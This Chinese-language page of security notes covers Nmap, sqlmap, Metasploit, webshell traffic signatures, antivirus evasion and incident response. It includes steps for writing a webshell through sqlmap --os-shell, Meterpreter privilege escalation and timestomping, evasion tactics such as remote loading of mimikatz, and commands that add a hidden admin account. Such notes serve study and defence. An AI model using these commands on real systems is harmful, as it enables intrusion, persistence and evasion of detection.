<h1 id="0x05-安全工具篇"><a href="#0x05-安全工具篇" class="headerlink" title="0x05.安全工具篇"></a>0x05.安全工具篇</h1><h2 id="1-CS工具使用"><a href="#1-CS工具使用" class="headerlink" title="1.CS工具使用"></a>1.CS工具使用</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">此处建议各位自己安装一个点击一下就知道了   （渗透神器）<br></code></pre></td></tr></table></figure>

<h2 id="2-Nmap常用命令"><a href="#2-Nmap常用命令" class="headerlink" title="2.Nmap常用命令"></a>2.Nmap常用命令</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap hostname/ip或者多个ip或者子网192.168.123.*<br><span class="hljs-deletion">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="hljs-deletion">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="hljs-deletion">-O 探测操作系统信息</span><br><span class="hljs-deletion">-sV 查找主机服务版本号</span><br><span class="hljs-deletion">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="hljs-deletion">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="hljs-deletion">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="hljs-deletion">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="hljs-deletion">-sN TCP空扫描</span><br><span class="hljs-deletion">-F 快速扫描</span><br><span class="hljs-deletion">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="hljs-deletion">-p 指定端口/端口范围</span><br><span class="hljs-deletion">-oN 将报告写入文件</span><br><span class="hljs-deletion">-v 详细信息</span><br><span class="hljs-deletion">-T&lt;0-5&gt; 设定速度</span><br><br>使用脚本：<br><span class="hljs-deletion">--script all 使用所有脚本</span><br><span class="hljs-deletion">--script=sql.injection.nse sql注入</span><br><span class="hljs-deletion">--script=&quot;smb*&quot;  扫smb系列</span><br>一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS 侦测(-O)<br>二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Null scan等，<br>三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX<br>四、漏洞检测可直接 nmap 目标 --script=auth,vuln<br></code></pre></td></tr></table></figure>

<h2 id="3-SQLmap篇"><a href="#3-SQLmap篇" class="headerlink" title="3.SQLmap篇"></a>3.SQLmap篇</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-u 单个URL -m xx<span class="hljs-selector-class">.txt</span> 多个URL<br>-d <span class="hljs-string">&quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;</span>  作为服务器客户端，直接连接数据库<br><span class="hljs-attr">--data</span> post/get都适用<br>-<span class="hljs-selector-tag">p</span> 指定扫描的参数<br>-r 读取文件<br>-f 指纹信息<br><span class="hljs-attr">--tamper</span> 混淆脚本，用于应用层过滤<br><span class="hljs-attr">--cookie</span> <span class="hljs-attr">--user-agent</span> <span class="hljs-attr">--host</span>等等http头的修改<br><span class="hljs-attr">--threads</span> 并发线程 默认为<span class="hljs-number">1</span><br><span class="hljs-attr">--dbms</span> MySQL&lt;<span class="hljs-number">5.0</span>&gt; 指定数据库或版本<br><br>–level=LEVEL 执行测试的等级（<span class="hljs-number">1</span>-<span class="hljs-number">5</span>，默认为 <span class="hljs-number">1</span>）<br>–risk=RISK 执行测试的风险（<span class="hljs-number">0</span>-<span class="hljs-number">3</span>，默认为 <span class="hljs-number">1</span>） Risk升高可造成数据被篡改等风险<br>–current-db / 获取当前数据库名称<br>–dbs 枚举数据库管理系统数据库<br>–tables 枚举 DBMS 数据库中的表<br>–<span class="hljs-attribute">columns</span> 枚举 DBMS 数据库表列<br>-D DB 要进行枚举的数据库名<br>-T TBL 要进行枚举的数据库表<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br><br>常用的tamper：<br> base64encode<span class="hljs-selector-class">.py</span> #转为b64编码<br> charencode<span class="hljs-selector-class">.py</span> url编码<br> chardoubleencode<span class="hljs-selector-class">.py</span> 双URL编码<br> unmagicquotes<span class="hljs-selector-class">.py</span> 宽字节<br> randomcomments<span class="hljs-selector-class">.py</span> 用<span class="hljs-comment">/**/</span>分割SQL关键字<br> space2plus<span class="hljs-selector-class">.py</span> space2comment<span class="hljs-selector-class">.py</span> space2xxxx<span class="hljs-selector-class">.py</span> 替换空格为xx<br> <br> Post注入：<br>  sqlmap -r <span class="hljs-string">&quot;数据包地址&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;参数&quot;</span> -dbms 数据类型<br> Get注入<br>  sqlmap -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--dbms</span> 参数<br>sqlmap进行交互式写shell <br><span class="hljs-number">1</span>-前提条件：最高权限、知道web网站绝对路径、能获取到cookie <br><span class="hljs-number">2</span>-sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;cookie值&quot;</span> <span class="hljs-attr">--os-shell</span> <br> -echo “一句话木马”&gt;网站的绝对路径 <br><span class="hljs-number">3</span>-输入web网站的绝对路径 <br><span class="hljs-number">4</span>-传木马<br></code></pre></td></tr></table></figure>

<h2 id="4-菜刀、蚁剑、冰蝎流量特征"><a href="#4-菜刀、蚁剑、冰蝎流量特征" class="headerlink" title="4.菜刀、蚁剑、冰蝎流量特征"></a>4.菜刀、蚁剑、冰蝎流量特征</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">菜刀特征<br>使用了<span class="hljs-built_in">base64</span>的方式加密了发送给“菜刀马”的指令，其中的两个关键payload z1和z2，这个名字是可变的<br><br>蚁剑特征<br>默认的USER-agent请求头 是 antsword xxx，但是 可以通过修改：/modules/request.js 文件中 请求UA绕过<br>其中流量最中明显的特征为@ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码<br><br>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以“_0x......=”这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量<br><br>冰蝎<br>看包没有发现什么特征，但是可以发现它是POST请求的<br>1、Accept头有application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征（UA头的浏览器版本很老）<br>2、特征分析Content-Type: application/octet-stream 这是一个强特征查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；很少使用<br><span class="hljs-comment">#冰蝎2特征： </span><br>默认Accept字段的值很特殊,而且每个阶段都一样冰蝎内置了十余种UserAgent ，每次连接 shell 会随机选择一个进行使用。但都是比较老的，r容易被检测到，但是可以在burp中修改ua头。<br>Content-Length: 16, 16就是冰蝎2连接的特征 <br><br><span class="hljs-comment">#冰蝎3特征： </span><br>冰蝎3取消动态密钥获取，目前很多waf等设备都做了冰蝎2的流量特征分析，所以3取消了动态密 钥获取；php抓包看包没有发现什么特征，但是可以发现它是POST请求的 <br>1）Accept头application/xhtml+xmlapplication/xmlapplication/signed- exchange属于弱特征 <br>2）ua头该特征属于弱特征。通过burp可以修改,冰蝎3.0内置的默认16个userAgent都比较老。现实生活中很少有人使用，所以这个也可以作为waf规则特征 <br><br>jsp抓包特征分析Content-Type: application/octet-stream 这是一个强特征查阅资料可知 octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交 一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；很少使用。<br></code></pre></td></tr></table></figure>

<h2 id="5-哥斯拉流量特征"><a href="#5-哥斯拉流量特征" class="headerlink" title="5.哥斯拉流量特征"></a>5.哥斯拉流量特征</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">### PHP连接特征</span><br>（1）php_XOR_BASE64<br>设置代理，用burp抓包。截取到特征发**现请求都含有<span class="hljs-string">&quot;pass**=&quot;</span>第一个包<br>第二个包<br>POST /hackable/uploads/base.php HTTP/1.1<br><span class="hljs-section">User-Agent: Java/1.8.0_131</span><br><span class="hljs-section">Host: 192.168.0.132:777</span><br><span class="hljs-section">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="hljs-section">Content-type: application/x-www-form-urlencoded</span><br><span class="hljs-section">Content-Length: 51</span><br><span class="hljs-section">Connection: close</span><br>pass=AWEzAAN%2FWFI3XHNGaGBQWDEHPwY4fSQAM2AIDw%3D%3D<br><br><span class="hljs-comment">###jsp连接特征</span><br>（1）java_AES_BASE64<br>POST /gejs.jsp HTTP/1.1<br><span class="hljs-section">User-Agent: Java/1.8.0_131</span><br><span class="hljs-section">Host: 192.168.0.132:555</span><br><span class="hljs-section">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="hljs-section">Content-type: application/x-www-form-urlencoded</span><br><span class="hljs-section">Content-Length: 33035</span><br><span class="hljs-section">Connection: close</span><br>pass=0%2FMHwbBP6vuX0WyYztOU9DrUPcD0Zwx0KhArobwwHBDld91Y8xrUqPxo40dKoSbGd%2FxDF4yJopsUIHMI8NMfFUl0oxBzWPyMdTmxAntagmMGLGiqB1ckbl5G%2FlapnewWrvhhdqtj0eT2zvUes%2Bg6yhFGVjLstoOdJxkYPY6XB70AeffugDlCkUYAyHyrTymPocUs14sKD5ItAn5147goo9TAdBH0kgSNlxbqxMqTPbgjKljsvC53fFB%2BO5jKUBCBvsCR1W%2FLhPA42qp1e%2Fl0cmUohwSAT3N0s9r%2FzRVlB3lQkXnV895dz48DyPbYjJp%2Bhpf1qFjbCy1o8Zd771ObGbKvWr1O5PZOTNKBu<br>**与php请求一样都含有<span class="hljs-string">&quot;pass=&quot;</span>而且发起连接时服务器返回的Content-Length是0**<br><br>（2）java_AES_RAW<br>POST /rwj.jsp HTTP/1.1<br><span class="hljs-section">User-Agent: Java/1.8.0_131</span><br><span class="hljs-section">Host: 192.168.0.132:555</span><br><span class="hljs-section">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="hljs-section">Content-type: application/x-www-form-urlencoded</span><br><span class="hljs-section">Content-Length: 23360</span><br><span class="hljs-section">Connection: close</span><br><span class="hljs-section">Óó•Á°Oêû•Ñl•ÎÓ•ô:Ô=Àôg•t*•+¡¼0••åwÝXó•Ô¨ühãGJ¡&amp;ÆwüC•••¢••s•ðÓ••It£•sXü•u9±•&#123;Z•c•,hª•W$n^FþV©•ì•®øav«cÑäöÎõ•³è:Ê</span><br>HTTP/1.1 200 OK<br><span class="hljs-section">Server: Apache-Coyote/1.1</span><br><span class="hljs-section">Set-Cookie: JSESSIONID=1C26762D96A561D4A63BDE104E22930C; Path=/; HttpOnly</span><br><span class="hljs-section">Content-Type: text/html</span><br><span class="hljs-section">Content-Length: 0</span><br><span class="hljs-section">Date: Wed, 18 Nov 2020 15:19:56 GMT</span><br><span class="hljs-section">Connection: close</span><br><br>口头表述：<br></code></pre></td></tr></table></figure>

<h2 id="6-wireshark简单的过滤规则"><a href="#6-wireshark简单的过滤规则" class="headerlink" title="6.wireshark简单的过滤规则"></a>6.wireshark简单的过滤规则</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">过滤 ip: <br>过滤源<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">src</span>==1.1.1.1;,目的<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">dst</span>==1.1.1.1; <br>过滤端口: <br>过滤 80 端口:tcp.<span class="hljs-attribute">port</span>==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80 <br>协议过滤: <br>直接输入协议名即可,如 http 协议 http <br>http 模式过滤: <br>过滤 get/post 包 http.request.<span class="hljs-attribute">mothod</span>==&quot;GET/POST&quot; <br></code></pre></td></tr></table></figure>

<h2 id="7-MSF基本使用方法"><a href="#7-MSF基本使用方法" class="headerlink" title="7.MSF基本使用方法"></a>7.MSF基本使用方法</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/cc92324f7991389d213002fdf7f6b585.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">常用命令 <br>background <span class="hljs-comment">#让meterpreter处于后台模式 </span><br>sessions -i number <span class="hljs-comment">#与会话进行交互，number表示第n个session </span><br>quit <span class="hljs-comment">#退出会话 </span><br>shell <span class="hljs-comment">#获得命令行 </span><br><span class="hljs-built_in">cat</span> c:\\boot.ini <span class="hljs-comment">#查看文件内容 </span><br>getwd <span class="hljs-comment">#查看当前工作目录 </span><br>work directory upload /root/Desktop/netcat.exe c:\\ <span class="hljs-comment"># 上传文件到目标机上 </span><br>download 0xfa.txt /root/Desktop/ <span class="hljs-comment"># 下载文件到本机上 </span><br>edit c:\\boot.ini <span class="hljs-comment"># 编辑文件 </span><br>search -d d:\\www -f web.config <span class="hljs-comment">#search 文件 ps #查看当前活跃进程 </span><br>migrate pid <span class="hljs-comment">#将Meterpreter会话移植到进 程数位pid的进程中 </span><br>execute -H -i -f cmd.exe <span class="hljs-comment">#创建新进程cmd.exe，-H不可 见，-i交互 getpid #获取当前进程的</span><br>pid <span class="hljs-built_in">kill</span> pid <span class="hljs-comment">#杀死进程 getuid #查看权限 </span><br>sysinfo <span class="hljs-comment">#查看目标机系统信息，如机器名，操作系统等 </span><br>getsystem <span class="hljs-comment">#提权操作 </span><br>timestompc:/a.doc -c <span class="hljs-string">&quot;10/27/2015 14:22:11&quot;</span> <span class="hljs-comment">#修改文件的创建时间 </span><br><br><span class="hljs-comment"># 迁移进程 </span><br>1-meterpreter &gt; ps <br>2-自行选择PID <br>3-meterpreter &gt; migrate pid<br></code></pre></td></tr></table></figure>

<h1 id="0x06-木马免杀篇"><a href="#0x06-木马免杀篇" class="headerlink" title="0x06.木马免杀篇"></a>0x06.木马免杀篇</h1><p>免杀可以先fuzz定位出被查杀的语句，然后对被查杀那部分进行一波操作，像是加密啊、编码啊、动态执行啊什么的，或者拆分拼接啊，特定条件执行啊，方法很多，主要就是找到那里被杀了，然后对被杀的部分进行处理.</p>
<h2 id="00-无文件执行木马的方式有哪些？"><a href="#00-无文件执行木马的方式有哪些？" class="headerlink" title="00-无文件执行木马的方式有哪些？"></a>00-无文件执行木马的方式有哪些？</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">powershell（脚本解析器） 》》》powershell.<span class="hljs-keyword">exe</span>（应用程序）<br><br>VB.script（脚本解析器） 》》》cscript.<span class="hljs-keyword">exe</span>（应用程序）<br><br>bat处理 （脚本解析器） 》》》cmd.<span class="hljs-keyword">exe</span>（应用程序）<br><br>javaSrtipt（脚本解析器） 》》》mshta.<span class="hljs-keyword">exe</span>（应用程序）<br></code></pre></td></tr></table></figure>

<h2 id="01-shellcode免杀？"><a href="#01-shellcode免杀？" class="headerlink" title="01-shellcode免杀？"></a>01-shellcode免杀？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">1.编码<br>2.加壳 <br>3.混淆 <br>4.分离免杀<br>5.特征码修改<br>6.添加无用逻辑语句<br>7.重写api<br></code></pre></td></tr></table></figure>

<h2 id="02-分离免杀"><a href="#02-分离免杀" class="headerlink" title="02-分离免杀"></a>02-分离免杀</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的<br></code></pre></td></tr></table></figure>

<h2 id="03-powershell远程加载？"><a href="#03-powershell远程加载？" class="headerlink" title="03-powershell远程加载？"></a>03-powershell远程加载？</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">可以远程加载mimikazt，远控文件，<span class="hljs-keyword">exe</span>可执行文件实现无文件落地。<br></code></pre></td></tr></table></figure>

<h1 id="0x07-应急与响应"><a href="#0x07-应急与响应" class="headerlink" title="0x07.应急与响应"></a>0x07.应急与响应</h1><h2 id="01-Windows加固方法"><a href="#01-Windows加固方法" class="headerlink" title="01-Windows加固方法"></a>01-Windows加固方法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">Windows加固：修改弱口令，对各个服务密码排查，然后对服务配置文件进行更改禁用php函数实行黑名单白名单<br>对服务版本进行排查查找当前版本是否存在Nday<br>iptable设置用户相关服务端口<br>安装杀毒软件<br></code></pre></td></tr></table></figure>

<h2 id="02-形容passwd和shadow区别"><a href="#02-形容passwd和shadow区别" class="headerlink" title="02-形容passwd和shadow区别"></a>02-形容passwd和shadow区别</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd 存账户信息一般不存密码  <br><br><span class="hljs-regexp">/etc/</span>shadow主要用来存密码<br><br><span class="hljs-regexp">/etc/</span>passwd默认是任意用户可读只有root用户可修改  <span class="hljs-regexp">/etc/</span>shadow 默认只有root用户可读可写<br><br><span class="hljs-regexp">/etc/</span>passwd 包含系统用户和用户的主要信息<br><br><span class="hljs-regexp">/etc/</span>shadow 用于储存系统中用户的密码，又称为影子文件<br><br><span class="hljs-regexp">/etc/g</span>roup 记录组ID和组名的对应文件<br></code></pre></td></tr></table></figure>

<h2 id="03-系统日志分析"><a href="#03-系统日志分析" class="headerlink" title="03-系统日志分析"></a>03-系统日志分析</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">常见的应急响应事件分类：<br>web入侵：网页挂马、主页篡改、Webshell<br>系统入侵：病毒木马、勒索软件、远控后门<br>网络攻击：DDOS攻击、DNS劫持、ARP欺骗<br></code></pre></td></tr></table></figure>

<h2 id="04-网站被挂马如何应急"><a href="#04-网站被挂马如何应急" class="headerlink" title="04-网站被挂马如何应急"></a>04-网站被挂马如何应急</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">1</span>.取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件-注意文件的时间，用户，后缀等属性），调取日志（系统，中间件日志，WAF日志等）；<br><span class="hljs-number">2</span>.处理，恢复备份（快照回滚最近一次），确定入侵方法（漏洞检测并进行修复）<br><span class="hljs-number">3</span>.溯源，查入侵IP，入侵手法（网路攻击事件）的确定等<br><span class="hljs-number">4</span>.记录，归档<span class="hljs-comment">--------预防-事件检测-抑制-根除-恢复-跟踪-记录通用漏洞的应对等其他安全应急事件</span><br></code></pre></td></tr></table></figure>

<h2 id="05-Windows中毒了-如何应急"><a href="#05-Windows中毒了-如何应急" class="headerlink" title="05-Windows中毒了 如何应急"></a>05-Windows中毒了 如何应急</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stata">一、检查系统账号安全<br>1、查看服务器是否有弱口令、可疑账号、隐藏账号、克隆账号、远<br>程管理端口是否对公网开放。<br>2、<span class="hljs-keyword">Win</span>+R 打开运行，输入“eventvwr.msc”打开操作系统日志，查<br>看管理员登录时间、用户名是否存在异常<br><br>二、检查异常端口、进程<br>1、使用 netstat -<span class="hljs-keyword">ano</span> 检查端口连接情况，是否有远程连接、可疑<br>连接（主要定位 ESTABLISHED）。<br>2、根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位<br>tasklist | findstr “PID”<br>3、也可以使用 <span class="hljs-keyword">D</span> 盾_web 查杀工具、火绒剑、XueTr 等工具进行判断可疑进程（如蓝色、红色进程、没有签名验证信息的进程、没有描述信息的进程、进程的属主、进程的路径是否合法、 CPU 或内存资源占用长时间过高的进程）<br><br>三、检查启动项、计划任务、服务<br>1、检查服务器是否有异常的启动项，如：单击开始菜单 &gt;【运行】，输入 msconfig看一下启动项是否存在可疑启动，注册表<span class="hljs-keyword">run</span>键值是否存在可疑启用文件，组策略，运行 gpedit.msc 查看脚本启动是否存在启用文件等<br>2、检查计划任务，如单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径<br>3、检查服务自启动，如单击【开始】&gt;【运行】，输入 services.msc，注意服务状态和启动类型，检查是否有异常服务。<br><br>四、检查系统相关信息<br>1、查看系统版本以及补丁信息<br>检查方法：单击【开始】&gt;【运行】，输入 systeminfo，查看系统信<br>息是否打了补丁<br>2、查找可疑目录及文件<br>检查方法：<br>a、查看用户目录，新建账号会在这个目录生成一个用户目录，查看<br>是否有新建用户目录。<br><span class="hljs-keyword">Window</span> 2003 C:\Documents and Settings<br><span class="hljs-keyword">Window</span> 2008R2 C:\Users\ b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。<br>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查<br>找可疑文件。<br><br>五、自动化查杀<br>用360、卡巴斯基等病毒查杀系统病毒木马，Web 可以用 <span class="hljs-keyword">D</span> 盾、河马<br>工具查杀 Webshell 后门<br><br>六、日志分析<br>用 360 星图日志分析工具进行分析攻击痕迹或手工结合 EmEditor 进<br>行日志分析<br></code></pre></td></tr></table></figure>

<h2 id="06-主机被入侵"><a href="#06-主机被入侵" class="headerlink" title="06-主机被入侵"></a>06-主机被入侵</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 优先提取易消失的数据<br><span class="hljs-bullet">   -</span> 内存信息<br><span class="hljs-bullet">   -</span> 系统进程<span class="hljs-code">`free -m`</span><br><span class="hljs-bullet">   -</span> 路由信息<span class="hljs-code">`tracert`</span><br><span class="hljs-bullet">2.</span> ifconfig`查看网卡流量，检查网卡的发送、接收数据情况<br><span class="hljs-bullet">3.</span> NetHogs`实时监控带宽占用状况<br><span class="hljs-bullet">4.</span> 查看Linux系统日志 <span class="hljs-code">`/var/log`</span><br><span class="hljs-bullet">5.</span> ClamAV`杀毒软件<br></code></pre></td></tr></table></figure>

<h2 id="07-如何发现克隆账号、隐藏账号"><a href="#07-如何发现克隆账号、隐藏账号" class="headerlink" title="07-如何发现克隆账号、隐藏账号"></a>07-如何发现克隆账号、隐藏账号</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">去注册表里查看用户、使用安全工具、<span class="hljs-keyword">d</span>盾查影子用户<br><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ 123 /add  <span class="hljs-comment">//添加隐藏用户</span><br><span class="hljs-keyword">net</span> localgroup administrators <span class="hljs-keyword">test</span>$ /add  <span class="hljs-comment">//添加进用户组</span><br>注册表种删除 regedit 路径 HKEY_LOCAL_MACHINE --SAM–SAM(需要右击权限修改管理员权限)-Domains-Account-users 查看Users表项与Names表项中的项数量是否一致<br>lusrmgr.msc<br><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ 123/del 删除<br></code></pre></td></tr></table></figure>

